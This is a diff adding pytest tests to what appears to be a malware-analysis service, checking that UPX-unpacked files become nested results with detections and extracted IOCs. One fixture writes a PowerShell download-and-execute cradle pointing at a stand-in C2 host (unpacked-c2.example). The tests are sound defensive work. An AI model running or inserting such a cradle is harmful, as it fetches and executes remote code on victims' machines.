@@ -124,3 +124,75 @@ def test_pe_analyze_skips_floss_capa_when_unpacked(tmp_path, monkeypatch) -> Non
     assert r["floss"]["status"] == "skipped" and "unpacked" in r["floss"]["detail"]
     assert r["_unpacked_files"] == [(str(tmp_path / "a.exe"), "a.exe")]
     assert r["unpack"]["status"] == "unpacked" and "_files" not in r["unpack"]
+
+
+def _fake_upx(path, out):
+    """Stand-in for upx -d: 'unpacks' a script and a PE into the output dir."""
+    out.mkdir(parents=True, exist_ok=True)
+    (out / "payload.ps1").write_text(
+        "IEX (New-Object Net.WebClient).DownloadString('http://unpacked-c2.example/inv.ps1')\n")
+    (out / "inner.exe").write_bytes(ms.packed_pe_exe().replace(b"UPX0", b".text").replace(b"UPX1", b".data"))
+    return {"status": "ok", "tool": "upx -d (mock)", "detail": "unpacked", "duration_s": 0.1}
+
+
+@pytest.fixture()
+def _client(tmp_path, monkeypatch):
+    from fastapi.testclient import TestClient
+
+    from docutracex.app import create_app
+    from docutracex.config import settings
+    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
+    (tmp_path / "cases").mkdir()
+    monkeypatch.setitem(unpack._UNPACKERS, "upx", _fake_upx)
+    monkeypatch.setattr(unpack, "run_die", lambda p: {"status": "not_provisioned"})
+    return TestClient(create_app())
+
+
+def _run(client, name, data):
+    import time
+
+    from docutracex.config import settings
+    r = client.post("/api/cases", files={"file": (name, data)}).json()
+    for _ in range(1200):
+        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == r["task"]["id"]), {})
+        if t.get("state") in ("completed", "failed"):
+            break
+        time.sleep(0.05)
+    return settings.cases_dir / r["analysis_id"] / "results"
+
+
+def _flat(nodes):
+    for n in nodes:
+        yield n
+        yield from _flat(n.get("children") or [])
+
+
+def test_unpacked_files_become_nested_children(_client) -> None:
+    import json
+    res = _run(_client, "sample_packed.exe", _UPX_PE)
+    item = json.loads((res / "msi.json").read_text())["items"][0]
+    assert item["unpack"]["status"] == "unpacked" and "_unpacked_files" not in item
+    tree = json.loads((res / "nested.json").read_text())["tree"]
+    kids = {n["filename"]: n for n in tree if n.get("source") == "unpack"}
+    assert set(kids) == {"payload.ps1", "inner.exe"}
+    assert kids["payload.ps1"]["recipe"] == ["unpack", "upx"]
+    assert "ps_download" in {f["rule"] for f in kids["payload.ps1"].get("findings") or []}
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert "http://unpacked-c2.example/inv.ps1" in iocs
+    # the unpacked script is not collected again as a top-level script
+    ps = json.loads((res / "powershell.json").read_text()) if (res / "powershell.json").exists() else {"scripts": []}
+    assert not [s for s in ps["scripts"] if not s.get("from_nested")]
+
+
+def test_packed_pe_inside_an_archive_is_unpacked_too(_client) -> None:
+    import io
+    import json
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as z:
+        z.writestr("factura_visor.exe", _UPX_PE)
+    res = _run(_client, "factura.zip", buf.getvalue())
+    nodes = list(_flat(json.loads((res / "nested.json").read_text())["tree"]))
+    exe = next(n for n in nodes if n["filename"] == "factura_visor.exe")
+    assert {"payload.ps1", "inner.exe"} <= {c["filename"] for c in exe.get("children") or []}
+    assert next(c for c in exe["children"] if c["filename"] == "payload.ps1")["recipe"] == ["unpack", "upx"]
